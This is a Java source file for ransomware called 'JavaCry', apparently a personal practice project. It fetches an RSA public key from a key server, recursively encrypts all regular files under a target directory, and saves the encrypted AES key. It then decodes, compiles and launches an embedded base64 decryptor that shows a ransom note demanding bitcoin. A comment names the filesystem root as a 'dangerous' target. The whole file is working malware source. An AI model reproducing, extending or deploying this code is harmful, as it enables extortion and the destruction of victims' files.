import java.util.*;
import java.util.stream.Collectors;
import java.net.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.stream.Stream;

import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.*;
import java.security.spec.X509EncodedKeySpec;



public class JavaCry {
/*
   Dangerous target paths:
   Mac & Linux:
   private static String targetPath = "/";

   Windows:
   private static String targetPath = "C:\";
 */
private static String addr = "127.0.0.1";
private static String targetPath = "/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
private static String os = System.getProperty("os.name").split(" ")[0];
private static List<Path> files = new ArrayList<Path>();
private static Random rand = new Random(System.currentTimeMillis());
private static int id = (int)(rand.nextInt(Integer.MAX_VALUE));
private static RSACrypt crypto;
private static String decryptorPayload = "aW1wb3J0IGphdmEuYXd0Lio7CmltcG9ydCBqYXZheC5zd2luZy4qOwppbXBvcnQgamF2YS5hd3QuZXZlbnQuKjsKCmltcG9ydCBqYXZhLnV0aWwuKjsKaW1wb3J0IGphdmEubmV0Lio7CmltcG9ydCBqYXZhLmlvLio7CmltcG9ydCBqYXZhLmlvLkZpbGVPdXRwdXRTdHJlYW07CmltcG9ydCBqYXZhLnV0aWwuc3RyZWFtLkNvbGxlY3RvcnM7CmltcG9ydCBqYXZhLm5pby5maWxlLkZpbGVzOwppbXBvcnQgamF2YS5uaW8uZmlsZS5QYXRoOwppbXBvcnQgamF2YS5uaW8uZmlsZS5QYXRoczsKaW1wb3J0IGphdmEuaW8uRmlsZUlucHV0U3RyZWFtOwppbXBvcnQgamF2YS5pby5GaWxlT3V0cHV0U3RyZWFtOwppbXBvcnQgamF2YS5zZWN1cml0eS5TZWN1cmVSYW5kb207CmltcG9ydCBqYXZheC5jcnlwdG8uQ2lwaGVyOwppbXBvcnQgamF2YXguY3J5cHRvLktleUdlbmVyYXRvcjsKaW1wb3J0IGphdmF4LmNyeXB0by5TZWNyZXRLZXk7CmltcG9ydCBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjOwppbXBvcnQgamF2YXguY3J5cHRvLnNwZWMuSXZQYXJhbWV0ZXJTcGVjOwppbXBvcnQgamF2YS51dGlsLkJhc2U2NDsKaW1wb3J0IGphdmEubmlvLmZpbGUuUGF0aDsKaW1wb3J0IGphdmEubmlvLmZpbGUuUGF0aHM7CmltcG9ydCBqYXZhLnV0aWwuc3RyZWFtLlN0cmVhbTsKCmltcG9ydCBqYXZhLnNlY3VyaXR5Lio7CmltcG9ydCBqYXZhLnNlY3VyaXR5LkludmFsaWRLZXlFeGNlcHRpb247CmltcG9ydCBqYXZheC5jcnlwdG8uQmFkUGFkZGluZ0V4Y2VwdGlvbjsKaW1wb3J0IGphdmF4LmNyeXB0by5JbGxlZ2FsQmxvY2tTaXplRXhjZXB0aW9uOwppbXBvcnQgamF2YS5zZWN1cml0eS5zcGVjLlBLQ1M4RW5jb2RlZEtleVNwZWM7CgoKLyoKICAgZGVjcnlwdG9yOgogICBCVEMgcGF5bWVudCBpbnRlcmZhY2UKICAgUmVxdWVzdCBmb3IgZGVjcnlwdGlvbiBmdW5jdGlvbmFsaXR5CiAgIGlmIHJlY2VpdmVzIHRoZSBrZXksIHVzZSB0aGUga2V5IHRvIGRlY3J5cHQgdGhlIGZpbGVzCiAgIGRlc3Ryb3kgZGVjcnlwdG9yLmphdmEKICovCgpjbGFzcyBEZWNyeXB0b3Igewpwcml2YXRlIHN0YXRpYyBpbnQgaWQgPSA4MDIxMzE1MDM7CnByaXZhdGUgU29ja2V0IHNvY2tldDsKcHJpdmF0ZSBTdHJpbmcgYWRkcmVzczsKcHJpdmF0ZSBpbnQgcG9ydDsKcHJpdmF0ZSBEYXRhT3V0cHV0U3RyZWFtIG91dCAgICAgPSBudWxsOwpwcml2YXRlIERhdGFJbnB1dFN0cmVhbSBpbiAgICAgPSBudWxsOwpwcml2YXRlIFN0cmluZyBiNjRwcml2a2V5Owpwcml2YXRlIFByaXZhdGVLZXkgcHJpdmF0ZV9rZXk7CnByaXZhdGUgc3RhdGljIGphdmEudXRpbC5MaXN0PFBhdGg+IGZpbGVzID0gbmV3IEFycmF5TGlzdDxQYXRoPigpOwpwcml2YXRlIHN0YXRpYyBTdHJpbmcgdGFyZ2V0UGF0aCA9ICIvVXNlcnMvZGFuaWVsL0Rlc2t0b3AvamF2YV9wcmFjdGljZS9KYXZhQ3J5L1Rlc3RfRW52IjsKcHJpdmF0ZSBDaXBoZXIgUlNBX0NpcGhlcjsKcHJpdmF0ZSBDaXBoZXIgQUVTX0NpcGhlcjsKCnB1YmxpYyBEZWNyeXB0b3IoKSB7CiAgICAgICAgYWRkcmVzcyA9ICIxMjcuMC4wLjEiOwogICAgICAgIHBvcnQgPSA1NTU1OwoKICAgICAgICBTdHJpbmcgbm90ZSA9IFN0cmluZy5qb2luKCJcbiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxodG1sPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjxoMT5Zb3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQuPC9oMT4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8cD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJZb3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQuIElmIHlvdSB3YW50IHRvIGRlY3J5cHQgeW91ciBmaWxlcywgcGxlYXNlIGNvcHkgdGhlIGNvbnRlbnQgb2Ygc2VuZHRvbWUudHh0IHNlbmQgaXQgd2l0aCAkMSBCVEMgdG8gYWRkcmVzcy4gWW91IGNhbiBnZW5lcmF0ZSB0aGUgdHJhbnNhY3Rpb24gb3V0cHV0IHdpdGggPGFkZHJlc3M+aHR0cHM6Ly9idGNtZXNzYWdlLmNvbS88L2FkZHJlc3M+LCBhbmQgY29weSBpdCB0byB5b3VyIEJUQyB3YWxsZXQgdG8gc2VuZCBtZSB5b3VyIG1vbmV5LiBJIHdpbGwgY2hlY2sgdGhlIHBheW1lbnRzIGJlZm9yZSBJIGFwcHJvdmUgeW91ciByZXF1ZXN0IGZvciBkZWNyeXB0aW9uLiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjwvcD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8cD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8YnI+PGI+RG9u4oCZdCBkZWxldGUgb3IgbW9kaWZ5IGFueSBjb250ZW50IGluIEtleV9wcm90ZWN0ZWQua2V5LCBvciB5b3Ugd2lsbCBsb3NlIHlvdXIgYWJpbGl0eSB0byBkZWNyeXB0IHlvdXIgZmlsZXMuPC9iPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjwvcD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8cD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8YnI+SWYgeW91IHdhbnQgdG8gb3BlbiB0aGlzIHdpbmRvdyBhZ2FpbiwgcGxlYXNlIHJ1biBEZWNyeXB0b3IuamFyLjxicj4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8L3A+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPC9odG1sPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgSkZyYW1lIGYgPSBuZXcgSkZyYW1lKCk7CiAgICAgICAgSlBhbmVsIHBhbmVsID0gbmV3IEpQYW5lbChuZXcgRmxvd0xheW91dCgpKTsKICAgICAgICBKTGFiZWwgaHRtbCA9IG5ldyBKTGFiZWwobm90ZSwgSkxhYmVsLkxFRlQpOwoKICAgICAgICAvLyBjcmVhdGluZyBhIEJ1dHRvbgogICAgICAgIEpCdXR0b24gYiA9IG5ldyBKQnV0dG9uKCJSZXF1ZXN0IGZvciBEZWNyeXB0aW9uIik7CiAgICAgICAgSkxhYmVsIHN0YXR1cyA9IG5ldyBKTGFiZWwoIiIpOwogICAgICAgIGIuYWRkQWN0aW9uTGlzdGVuZXIobmV3IEFjdGlvbkxpc3RlbmVyKCkgewoKICAgICAgICAgICAgICAgICAgICAgICAgQE92ZXJyaWRlCiAgICAgICAgICAgICAgICAgICAgICAgIHB1YmxpYyB2b2lkIGFjdGlvblBlcmZvcm1lZChBY3Rpb25FdmVudCBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMuc2V0VGV4dCgiVHJ5aW5nIHRvIGNvbm5lY3QiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29ja2V0ID0gbmV3IFNvY2tldChhZGRyZXNzLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLnNldFRleHQoIldhaXRpbmcgZm9yIGFwcHJvdmFsIik7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBzZW5kcyBvdXRwdXQgdG8gdGhlIHNvY2tldAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbiA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oc29ja2V0LmdldElucHV0U3RyZWFtKCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXQgPSBuZXcgRGF0YU91dHB1dFN0cmVhbShzb2NrZXQuZ2V0T3V0cHV0U3RyZWFtKCkpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0LndyaXRlVVRGKFN0cmluZy52YWx1ZU9mKGlkKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGI2NHByaXZrZXkgPSBpbi5yZWFkVVRGKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihiNjRwcml2a2V5KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIHB1YiA9IEJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKGI2NHByaXZrZXkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQS0NTOEVuY29kZWRLZXlTcGVjIHNwZWMgPSBuZXcgUEtDUzhFbmNvZGVkS2V5U3BlYyhwdWIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBLZXlGYWN0b3J5IGZhY3RvcnkgPSBLZXlGYWN0b3J5LmdldEluc3RhbmNlKCJSU0EiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpdmF0ZV9rZXkgPSBmYWN0b3J5LmdlbmVyYXRlUHJpdmF0ZShzcGVjKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLnNldFRleHQoIllvdSBhcmUgYXBwcm92ZWQsIGRlY3J5cHRpbmcgZmlsZXMiKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJTQV9DaXBoZXIgPSBDaXBoZXIuZ2V0SW5zdGFuY2UoIlJTQSIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBRVNfQ2lwaGVyID0gQ2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IChTdHJlYW08UGF0aD4gcGF0aHMgPSBGaWxlcy53YWxrKFBhdGhzLmdldCh0YXJnZXRQYXRoKSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlcyA9IHBhdGhzLmZpbHRlcihGaWxlczo6aXNSZWd1bGFyRmlsZSkuY29sbGVjdChDb2xsZWN0b3JzLnRvTGlzdCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGVycikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdEZpbGVzKCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMuc2V0VGV4dCgiWW91J3JlIGZpbGVzIGhhdmUgYmVlbiBkZWNyeXB0ZWQgc3VjY2Vzc2Z1bGx5Iik7CgoKICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2goVW5rbm93bkhvc3RFeGNlcHRpb24gdSkKICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbih1KTsKICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2goSU9FeGNlcHRpb24gaSkKICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLnNldFRleHQoIkNvbm5lY3Rpb24gZmFpbGVkIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGVycikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGVycik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKCgogICAgICAgIC8vIHNldHRpbmcgcG9zaXRpb24gb2YgYWJvdmUgY29tcG9uZW50cyBpbiB0aGUgZnJhbWUKICAgICAgICBiLnNldEJvdW5kcygxMDAsIDIwMCwgMjAwLCAzMCk7CiAgICAgICAgc3RhdHVzLnNldEJvdW5kcygxMDAsIDMwMCwgNDAwLCAzMCk7CiAgICAgICAgcGFuZWwuc2V0TGF5b3V0KG5ldyBGbG93TGF5b3V0KCkpOwoKICAgICAgICAvLyBhZGRpbmcgY29tcG9uZW50cyBpbnRvIGZyYW1lCiAgICAgICAgZi5hZGQoYik7CiAgICAgICAgZi5hZGQoc3RhdHVzKTsKCiAgICAgICAgcGFuZWwuYWRkKGh0bWwpOwogICAgICAgIGYuZ2V0Q29udGVudFBhbmUoKS5hZGQocGFuZWwpOwoKICAgICAgICAvLyBmcmFtZSBzaXplIDMwMCB3aWR0aCBhbmQgMzAwIGhlaWdodAogICAgICAgIGYuc2V0U2l6ZSgxMjAwLDYwMCk7CgogICAgICAgIC8vIHNldHRpbmcgdGhlIHRpdGxlIG9mIGZyYW1lCiAgICAgICAgZi5zZXRUaXRsZSgiSmF2YUNyeSBEZWNyeXB0b3IiKTsKICAgICAgICBmLnNldERlZmF1bHRDbG9zZU9wZXJhdGlvbihKRnJhbWUuRVhJVF9PTl9DTE9TRSk7CgogICAgICAgIC8vIHNldHRpbmcgdmlzaWJpbGl0eSBvZiBmcmFtZQogICAgICAgIGYuc2V0VmlzaWJsZSh0cnVlKTsKfQoKcHVibGljIGJ5dGVbXSBSU0FDcnlwdChGaWxlIGYpIHsKICB0cnkgewogICAgRmlsZUlucHV0U3RyZWFtIGluID0gbmV3IEZpbGVJbnB1dFN0cmVhbShmKTsKICAgIGJ5dGVbXSBpbnB1dCA9IG5ldyBieXRlWyhpbnQpIGYubGVuZ3RoKCldOwogICAgaW4ucmVhZChpbnB1dCk7CgogICAgRmlsZU91dHB1dFN0cmVhbSBvdXQgPSBuZXcgRmlsZU91dHB1dFN0cmVhbShmKTsKICAgIGJ5dGVbXSBvdXRwdXQgPSBSU0FfQ2lwaGVyLmRvRmluYWwoaW5wdXQpOwoKICAgIHJldHVybiBvdXRwdXQ7CiAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICB9CiAgcmV0dXJuIG51bGw7Cn0KCnB1YmxpYyB2b2lkIEFFU0NyeXB0KEZpbGUgZikgewogIHRyeSB7CiAgICBGaWxlSW5wdXRTdHJlYW0gaW4gPSBuZXcgRmlsZUlucHV0U3RyZWFtKGYpOwogICAgYnl0ZVtdIGlucHV0ID0gbmV3IGJ5dGVbKGludCkgZi5sZW5ndGgoKV07CiAgICBpbi5yZWFkKGlucHV0KTsKCiAgICBGaWxlT3V0cHV0U3RyZWFtIG91dCA9IG5ldyBGaWxlT3V0cHV0U3RyZWFtKGYpOwogICAgYnl0ZVtdIG91dHB1dCA9IEFFU19DaXBoZXIuZG9GaW5hbChpbnB1dCk7CiAgICBvdXQud3JpdGUob3V0cHV0KTsKCiAgICBvdXQuZmx1c2goKTsKICAgIG91dC5jbG9zZSgpOwogICAgaW4uY2xvc2UoKTsKICAgIFN5c3RlbS5vdXQucHJpbnRsbigiRGVjcnlwdGluZyBmaWxlOiAiICsgZik7CiAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICB9Cn0KCnB1YmxpYyB2b2lkIGRlY3J5cHRGaWxlcygpIHsKCiAgICAgICAgdHJ5IHsKICAgICAgICAgIFJTQV9DaXBoZXIuaW5pdChDaXBoZXIuREVDUllQVF9NT0RFLCBwcml2YXRlX2tleSk7CiAgICAgICAgICBGaWxlIGsgPSBuZXcgRmlsZSgiS2V5X3Byb3RlY3RlZC5rZXkiKTsKICAgICAgICAgIGJ5dGVbXSBkYXRhID0gUlNBQ3J5cHQoayk7CiAgICAgICAgICBTZWNyZXRLZXkgQUVTS2V5ID0gbmV3IFNlY3JldEtleVNwZWMoZGF0YSwgMCwgZGF0YS5sZW5ndGgsICJBRVMiKTsKICAgICAgICAgIEFFU19DaXBoZXIuaW5pdChDaXBoZXIuREVDUllQVF9NT0RFLCBBRVNLZXkpOwogICAgICAgICAgZm9yIChQYXRoIHAgOiBmaWxlcykgewogICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgIEZpbGUgZiA9IHAudG9GaWxlKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgQUVTQ3J5cHQoZik7CiAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUpOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKDEgKyAiICIgKyBlKTsKICAgICAgICB9Cgp9CgovLyBtYWluIG1ldGhvZApwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmcgYXJnc1tdKSB7CgovLyBjcmVhdGluZyBpbnN0YW5jZSBvZiBGcmFtZSBjbGFzcwogICAgICAgIERlY3J5cHRvciBhd3Rfb2JqID0gbmV3IERlY3J5cHRvcigpOwp9Cgp9Cg==";
private static Process process;
private static List<String> avoidDir = new ArrayList<String>();

// decrypt files from a list of paths
public static void decryptFiles(String keyString) {
        crypto.setPubKey(keyString);

        for (Path p : files) {
                try {
                        File f = p.toFile();
                        crypto.decrypt(f);
                } catch (Exception e) {
                        System.out.println(e);
                }
        }
}

// encrypt files from a list of paths
public static void encryptFiles() {
        for (Path p : files) {
                try {
                        File f = p.toFile();
                        crypto.encrypt(f);
                } catch (Exception e) {
                        System.out.println(e);
                }
        }
}

public static String replaceLine(String src, int lineno, String content) {
        String out = "";
        String[] lines = src.split("\n");
        for (int i = 0; i < lines.length; i++) {
                if (i+1 == lineno) {
                        out += content + "\n";
                } else {
                        out += lines[i] + "\n";
                }
        }
        return out;
}

public static void main(String[] args) {
        System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD

        KeyClient key_client = new KeyClient(addr, 6666);
        if (key_client.getSuccess()) {

                try {
                        // send id hash to server
                        MessageDigest md = MessageDigest.getInstance("SHA-256");
                        byte[] hash = md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                        String b64hash = Base64.getEncoder().encodeToString(hash);
                        key_client.sendString(b64hash);

                        // received allocated public key
                        String b64pubkey = key_client.recvString();
                        byte[] pub = Base64.getDecoder().decode(b64pubkey);
                        X509EncodedKeySpec spec = new X509EncodedKeySpec(pub);
                        KeyFactory factory = KeyFactory.getInstance("RSA");
                        PublicKey public_key = factory.generatePublic(spec);

                        crypto = new RSACrypt(public_key);

                        key_client.close();
                } catch (Exception e) {
                        System.out.println(1+""+e);
                        return;
                }

                avoidDir.add("windows");
                avoidDir.add("library");
                avoidDir.add("boot");
                avoidDir.add("local");
                avoidDir.add("program files");
                avoidDir.add("programdata");
                avoidDir.add("System");
                avoidDir.add("Volumes");
                avoidDir.add("dev");
                avoidDir.add("etc");
                avoidDir.add("bin");
                avoidDir.add("$");

                // encrypt files recursively within the target directory
                try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
                        files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
                }
                catch (Exception e) {
                        ;
                }

                // This will encrypt files recursively in the target directory
                encryptFiles();
                crypto.SaveAESKey();


                try {
                        File f = new File("Decryptor.java");
                        if (!f.exists()) {
                                f.createNewFile();
                        }
                        File m = new File("manifest.txt");
                        if (!m.exists()) {
                                m.createNewFile();
                        }

                        // create Decryptor.jar
                        String code = new String(Base64.getDecoder().decode(decryptorPayload));
                        code = replaceLine(code, 42, "private static int id = " + String.valueOf(id) + ";");
                        FileWriter writer = new FileWriter("Decryptor.java");
                        PrintStream manifest = new PrintStream(new File("manifest.txt"));
                        manifest.println("Main-Class: Decryptor");
                        writer.write(code);
                        writer.close();

                        // run Decryptor.java
                        process = Runtime.getRuntime().exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                        BufferedReader b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                        String s;
                        while ((s = b.readLine()) != null) {
                                System.out.println(s);
                        }
                        b.close();

                        process = Runtime.getRuntime().exec(String.format("jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class ", System.getProperty("user.home")));
                        b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                        while ((s = b.readLine()) != null) {
                                System.out.println(s);
                        }
                        b.close();

                        // if (f.delete()) {
                        //         System.out.println("Deleted the file: " + f.getName());
                        // } else {
                        //         System.out.println("Failed to delete the file.");
                        // }
                        // if (m.delete()) {
                        //         System.out.println("Deleted the file: " + m.getName());
                        // } else {
                        //         System.out.println("Failed to delete the file.");
                        // }
                        //
                        // File classFile = new File("Decryptor.class");
                        // if (classFile.delete()) {
                        //         System.out.println("Deleted the file: " + classFile.getName());
                        // } else {
                        //         System.out.println("Failed to delete the file.");
                        // }


                        process = Runtime.getRuntime().exec(String.format("java -jar Decryptor.jar", System.getProperty("user.home")));

                } catch (Exception e) {
                        System.out.println(2+""+e);
                }

        }
}
}
